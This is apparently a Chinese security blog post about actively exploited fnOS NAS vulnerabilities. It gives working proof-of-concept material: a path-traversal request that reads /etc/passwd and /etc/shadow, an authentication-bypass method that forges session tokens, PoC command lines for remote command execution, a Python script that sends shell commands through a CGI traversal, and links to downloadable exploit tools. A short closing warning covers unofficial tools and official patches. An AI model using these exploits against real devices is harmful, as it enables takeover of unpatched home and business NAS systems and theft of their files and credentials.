#  【热点漏洞】——飞牛OS路径穿越、协议认证、命令执行（内附POC）  
原创 网络安全民工
                        网络安全民工  网络安全民工   2026-02-10 02:47  
  
#    
  
#   
  
# 一、路径穿越漏洞  
  
      飞牛OS（fnOS）近期确实爆发了**严重的安全事件**  
，涉及一个**高危路径穿越漏洞**  
，随后攻击持续升级，演变为一次针对性的复杂攻击。目前事件仍在发展中。  
  
  
### 关键信息：  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/T0ibbhsCmribQrh1e3SQIBPzFJKV2Qz60uaf3gOHkEM5iaxDexlNNb5STPjcxFMwS9Zjarrib4CczluenDkBFhVt0BbWIvBSGb7dgQnic5FGXAnc/640?wx_fmt=png&from=appmsg "")  
  
<table><thead><tr><th data-colwidth="119"><section><span leaf="">事项</span></section></th><th><section><span leaf="">关键信息</span></section></th></tr></thead><tbody><tr><td data-colwidth="119"><strong><span leaf="">漏洞性质</span></strong></td><td><strong><span leaf="">高危路径穿越漏洞</span></strong><section><span leaf="">，允许攻击者直接访问NAS上的任意文件（包括系统配置和私人数据）。</span></section></td></tr><tr><td data-colwidth="119"><strong><span leaf="">攻击升级</span></strong></td><td><section><span leaf="">攻击者随后推出病毒变种，</span><strong><span leaf="">破坏设备的OTA（在线）更新功能</span></strong><span leaf="">，阻止用户安装修复补丁，并伴有DDoS攻击。</span></section></td></tr><tr><td data-colwidth="119"><strong><span leaf="">官方应对</span></strong></td><td><section><span leaf="">官方在2月初连续发布多个紧急更新（从</span><strong><span leaf="">1.1.15到1.1.19</span></strong><span leaf="">），并提供多种修复方案。</span></section></td></tr><tr><td data-colwidth="119"><strong><span leaf="">当前风险</span></strong></td><td><section><span leaf="">截至2月4日，仍有超过30万台设备暴露在公网，面临风险。未升级的设备可能被持续控制。</span></section></td></tr></tbody></table>### 🔍 事件时间线与官方行动  
  
  
###   
- **1月31日左右**  
：漏洞在技术社区被曝光，用户发现可通过构造特殊URL访问设备全部文件。  
  
- **2月1日凌晨**  
：飞牛官方发布**fnOS 1.1.15版本**  
安全更新，修复初始漏洞。  
  
- **2月1日**  
：随后，官方再次紧急通知，要求用户升级至 **1.1.18版本**  
，以应对更复杂的攻击。  
  
- **2月2日-3日**  
：攻击升级。新病毒变种专门破坏系统更新服务，导致受感染设备无法通过OTA升级。官方确认这是一次有组织、针对性的攻击。  
  
- **2月4日**  
：社区消息显示，官方已推送**fnOS 1.1.19版本**  
。同时，因升级服务器一度受影响，官方建议从官网下载完整镜像进行更新。  
  
### ⚠️ POC漏洞  
  
  
###   
  
      攻击者无需复杂的工具，只需一个浏览器直接拼接或简单的 curl 命令，向目标服务器发送精心构造的恶意HTTP请求，即可触发漏洞。核心逻辑是通过构造 **../**  
（上层目录跳转符）突破Web目录限制。  
#### 1. 系统底牌泄露  
  
攻击者读取 /etc/passwd、/proc/version 等系统文件，获取操作系统版本、内核信息及用户账号列表，为进一步提权攻击提供精准情报。  
#### 2. 应用凭证窃取  
  
读取Web应用的配置文件（如 config.php、database.yml），直接获取数据库账号密码、第三方API密钥（Access Key）。一旦数据库沦陷，所有业务数据将瞬间蒸发。  
#### 3. 业务数据裸奔  
  
攻击者可以直接下载用户存储在私有云中的敏感文档、照片或商业机密，  
甚至获取Webshell，将“文件读取”升级为“服务器控制”。  
#### 4、POC案例  
```
GET/app-center-static/serviceicon/myapp/%7B0%7D?size=../../../../etc/passwdHTTP/1.1
Host: target_ip:port
```  
```

```  
```

```  
```
/app-center-static/serviceicon/myapp/{0}/?size=../../../../etc/shadow
```  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/T0ibbhsCmribRNoAbjDjNpcSzolic8wXqOsrcHFubOwzib87O5L7yYpQtBFvroSjNIt3asf3VZ1w5gtdavu3nrLdU45tvtiaqcZ7guFiaVAhRrbPU/640?wx_fmt=png&from=appmsg "")  
  
# 二、Websocket 协议认证绕过  
  
  
  进一步利用 通过任意文件读取 可以绕过Websocket 协议认证绕过 其实飞牛还存在这个漏洞  
  
    不需要读取任何 RSA 私钥文件，仅通过 “获取服务器公钥→构造合规加密包” 就能接入通信通道，最终靠命令注入实现 RCE  
  
### 1. 原理分析  
  
#### 1.1 登录逻辑  
  
  
飞牛OS的登录逻辑如下：  
```
用户请求 (Login/ChangePassword)
       |
       v
[ 应用程序 ]
       |
       +---> 1. 验证/修改密码
       |        |
       |        +---> [ 内存缓存 passwd ]
       |        |
       |        +---> [ Linux 系统调用 (crypt/PAM/chpasswd) ] ---> [ /etc/shadow ]
       |        |
       |        +---> [ smbpasswd 命令 ] ------------------------> [ Samba 密码库 ]
       |
       +---> 2. 登录成功后生成
                +---> [ 内存缓存 secret, token ]
                |
                +---> [ PostgreSQL 数据库 ] ---> 表: longtoken
```  
```

```  
  
  
授权命令执行需要拿到 secret 或者 token。但读取堆内存略微困难，因此要么读取到 longtoken 转化为 token，要么想办法利用业务漏洞。  
#### 1.2 交互逻辑  
  
  
前端使用 Websocket 协议交互，登录流程如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/T0ibbhsCmribTvUiaQLzXMpBsbSeyI6VqFAOYLric4WS38Qq8vVib0lDGb0qQh6icKDWT1k4QvbcIicjAhOOnF9ZV3WSQsAJWnrhWWynDTrOlqjL74/640?wx_fmt=png&from=appmsg "")  
  
#### 1.3 Token生成逻辑  
  
在 /usr/trim/bin/handlers/users.hdl 中的 do_login 函数中包含了 secret, token, longtoken的生成逻辑：  
- **Secret (16字节)**  
：随机生成的 16 字节数据，强制将第 16 字节设置为 o  
。  
  
- **Token (32字节)**  
：  
  
- **前 16 字节 (IV)**  
：由时间戳、计时器和随机数拼接而成。  
  
- 后 16 字节 (Cipher)  
：使用 RSA 密钥对 Secret 进行 AES 加密后的数据。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/T0ibbhsCmribRGjyZiaO7gSVY2CxtOJ5FYUTcoDkMZvTNAGk6gzWIwymwJ9uP5DEC4ocUpBFakG1rBSG6vL2yFd1IX4CZVzKpP9u6UK1Aicstu4/640?wx_fmt=png&from=appmsg "")  
  
```

```  
```

```  
```

```  
  
  
**因此 secret 和 token 可以相互转化**  
，这点很重要。  
  
在 /usr/trim/bin/trim 中的 handle_websocket_packet 函数中包含了鉴权逻辑。  
  
后端能够解析两种类型的包：  
- 加密包：不需要 secret 签名  
  
- 明文包：除非req白名单或者设置了no_sign，否则需要secret对请求体签名  
  
看上去可以构造一个加密包，然后使用 longtoken 进行登录，从而绕过签名：  
```
{
    "req": "user.tokenLogin",
    "reqid": xxx,
    "token": long_token, 
    "deviceType": xxx,
    "deviceName": xxx,
    "did": xxx,
    "si": xxx,
}
```  
  
遗憾的是，加密包会触发token长度的判断。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/T0ibbhsCmribSibbavmFibQp0AhlHdejjXwqwuVdwsxu0RbgSGD69h6fZYDAlZWLEt6w8MbIZM5leWXBl88vTZHbU1NtFAKS02SlGvTpt8dqiamw/640?wx_fmt=png&from=appmsg "")  
```

```  
  
  
不过这里存在另一个漏洞：  
  
**验签时如果存在 token 字段，则直接对 token 解密得到 secret，然后对请求体计算签名。**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/T0ibbhsCmribTMOjR4gXThRbvpRqJBounoZozGp5epIyNQLjibUFLFt9RAJ7YpMTXtdgsKdUyE0WoFO04UvZ97UfRf147AtVPKDd22iaOLpDE7Q/640?wx_fmt=png&from=appmsg "")  
  
  
  
因此，可以自己生成 secret 和 token 绕过认证。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/T0ibbhsCmribTINMIlEhiaAsLX4xPTicC30AibxYDNMOOJF1b8XySjsickqaERgUGIXx27X5KNBibKGej2LW74gHKwK0Eec2dEQ1zm0icSFAhGCL4YE/640?wx_fmt=png&from=appmsg "")  
  
```

```  
  
### 2. PoC  
  
  
需获取系统中的 rsa_private_key.pem  
（通过任意文件读取漏洞获取）。  
```
# 1. 命令执行
python poc.py -k ./rsa_private_key.pem rce
# 2. 获取会话token
python poc.py -k ./rsa_private_key.pem login -t 9XlXMOgDAABCfaZpAAAAAAluArwO5RZ2JbzjA6m9hmnjp0KtNSz/SA==
```  
  
# 三、授权命令执行  
  
## 1. CGI路径穿越  
  
  
/usr/trim/bin/trim_http_cgi 存在一个稍弱的路径穿越、命令执行。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/T0ibbhsCmribRgOX7Os1jXib9EuzIBuaIShxXwHGq4RQOyObcwvOE5L9LC4UKXc7oLWppsqpc8q6HvDc0iaCjT4IJ1hhjJWrbOGJAMUicMEwjmUM/640?wx_fmt=png&from=appmsg "")  
  
  
filepath.Join并不防御路径穿越，因此能从 /var/apps_ui 穿越到 /var，并执行任意文件。但存在有一些限制：  
1. 需要合法token  
  
1. 由于nginx的解析问题，只能穿越一层到 /var  
  
利用思路：需要结合认证绕过和后文提到的postgresql数据库中的longtoken，生成一个合法token，调用文件上传的API，上传一个bash到/var目录。  
```
import requests
import sys
TARGET_IP = "192.168.108.168"
TARGET_PORT = 5666
TOKEN = "g9auUGNTfmkV7fEAVF6qTdH2kQ9CgBkEHmkUBsNvU/8="
url = f"http://{TARGET_IP}:{TARGET_PORT}/cgi/third-party/%2e./bash"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    "Authorization": f"token {TOKEN}",
    "Content-Type": "application/x-www-form-urlencoded"
}
commands = "echo 1> /tmp/test.txt"
print(f"[*] Attacking: {url}")
print(f"[*] Using Token: {TOKEN[:10]}...")
print(f"[*] Command: {commands}")
try:
    # 发送 POST 请求
    response = requests.request("POST", url, headers=headers, data=commands, timeout=10)
    print("\n[+] Status Code:", response.status_code)
    print("[+] Response Body (Command Output):\n")
    print("-" * 40)
    print(response.text)
    print("-" * 40)
except Exception as e:
    print(f"[-] Error: {e}")
```  
```

```  
## 2. 读取postgresql数据库  
  
 PostgreSQL数据库位于 /var/lib/postgresql/*/main/base  
  
该目录下有若干个数据库目录，通常为40000+，需要读取每个数据库下的pg_class表（固定OID为1259），然后从中获取 longtoken 表的 OID。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/T0ibbhsCmribS74mU8icQ5JLvLk2YG6rB9knVXicCPia4dxJOedsX5ARraicsYfJ1U5ibbb8vibbpx9BXjnEdosXJur0ibIWe9cmG5ptZUhaoO4r5XFA/640?wx_fmt=png&from=appmsg "")  
  
```

```  
  
  
# 四、POC获取  
  
  
1、针对 FnOS 系统的综合漏洞利用工具可视化工具：  
  
https://download.csdn.net/download/zhengfei611/92650537  
  
2、飞牛系统（fnOS）远程代码执行链：认证绕过  
  
https://download.csdn.net/download/zhengfei611/92650538  
  
  
获取最新的飞牛OS漏洞，关注本公众号，并回复“  
飞牛OS  
”  
### ⚠️ 重要提醒  
- **谨慎使用非官方工具**  
：你文档末尾提到的综合漏洞利用工具和POC代码，**请务必谨慎对待**  
。这些来自非官方渠道（如个人博客、网盘）的文件**本身可能含有恶意代码**  
，在非隔离环境中运行极易导致自身设备被攻击。  
  
- **关注官方信息**  
：所有修复都应基于**飞牛官方社区**  
和**官网**  
的公告与更新包。不要轻信和传播未经验证的第三方修复工具。  
  
  
  
